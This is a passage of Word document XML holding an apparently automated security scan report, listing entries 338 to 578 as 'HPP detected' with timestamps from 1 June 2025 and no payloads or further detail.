        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.429948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338. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.432651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339. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.435340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340. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.438420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341. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.441323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342. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.444415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343. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.447544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344. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.449719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345. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.452351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346. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.455629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347. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.458176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348. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.460975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349. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.463633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350. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.465887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351. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.468019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352. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.470158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353. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.740208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354. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.746751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355. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.750503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356. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.754281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357. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.758418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358. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.762166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359. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.766278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360. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.770800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361. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.774632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362. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.778764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363. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.783670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364. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.788547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365. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.793404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366. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.797882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367. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.801137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368. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.803817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369. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.806301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370. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.808440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371. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.810559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372. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.812639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373. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.814628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374. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.816747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375. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.818892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376. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.821659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377. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.823807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378. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.825914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379. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.828085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380. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.830262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381. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.832313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382. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.835004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383. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.837167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384. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:23:53.839805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385. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.030306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386. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.035241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387. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.038638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388. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.041311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389. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.045098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390. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.048221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391. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.051411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392. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.054680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393. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.057333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394. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.061350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395. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.065209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396. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.068493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397. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.071579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398. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.075411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399. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.078670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400. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.080781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401. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.082898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402. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.085066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403. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.087223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404. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.089407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405. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.091528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406. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.094206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407. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.096927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408. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.099061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409. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.101213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410. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.103191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411. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.105837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412. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.107973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413. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.110121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414. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.112467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415. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.114616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416. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:26:59.117015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417. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.655393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418. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.660229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419. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.664061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420. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.667827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421. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.670530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422. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.674312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423. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.678059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424. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.681342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425. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.683534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426. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.687814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427. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.691066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428. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.694384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429. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.697586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430. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.700808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431. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.704538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432. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.706874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433. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.709025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434. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.711201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435. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.712825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436. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.714950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437. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.717104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438. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.718956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439. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.720880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440. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.722613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441. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.724729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442. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.727257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443. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.729422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444. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.731545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445. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.733217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446. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.735397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447. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.737554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448. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:30:04.739731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449. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.116622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450. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.120371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451. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.123630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452. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.126868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453. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.129529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454. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.132799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455. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.136629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456. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.139267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457. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.141986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458. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.145225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459. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.147970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460. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.151732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461. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.154994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462. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.157675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463. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.160348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464. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.162467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465. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.165127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466. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.167229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467. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.169326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468. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.171468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469. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.173064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470. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.175212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471. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.176822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472. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.179060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473. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.180664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474. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.182283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475. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.184402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476. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.186017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477. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.187738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478. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.189525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479. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.191947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480. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:33:10.194097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481. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.105929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482. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.110308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483. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.114075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484. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.117325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485. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.120546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486. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.123781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487. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.127038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488. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.130804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489. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.133509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490. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.137334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491. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.141230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492. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.143969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493. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.148338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494. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.151600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495. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.155341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496. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.157684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497. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.159838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498. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.162041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499. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.164167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500. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.165788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501. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.167917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502. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.169540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503. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.172233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504. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.173839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505. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.175949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506. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.177580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507. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.179204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508. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.181284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509. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.183420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510. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.185223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511. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.187412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512. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:36:16.189044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513. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.870552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514. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.874283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515. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.877513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516. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.880733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517. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.883983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518. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.887315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519. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.889968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520. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.892665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521. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.895879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522. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.899630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523. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.902387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524. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.905627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525. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.908280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526. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.911466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527. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.914655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528. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.916769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529. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.919432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530. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.921019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531. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.923145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532. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.924758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533. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.926888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534. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.929059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535. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.931217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536. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.932861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537. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.935042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538. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.936665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539. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.938790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540. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.940901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541. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.943050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542. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.944631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543. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.946754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544. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:39:21.948488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545. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.673170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546. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.678199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547. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.681480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548. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.685047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549. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.688301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550. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.691499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551. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.694142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552. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.697887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553. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.701127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554. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.704339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555. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.707573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556. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.710820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557. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.714017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558. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.716662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559. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.719471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560. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.722169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561. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.724878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562. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.726997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563. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.728607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564. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.731012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565. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.732700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566. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.734831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567. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.736402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568. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.738570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569. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.740161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570. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.741765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571. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.743894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572. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.746035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573. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.748216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574. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.752026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575. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.757320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576. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:42:27.761621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577. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.256198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578. **HPP detected**</w:t>
        <w:br/>
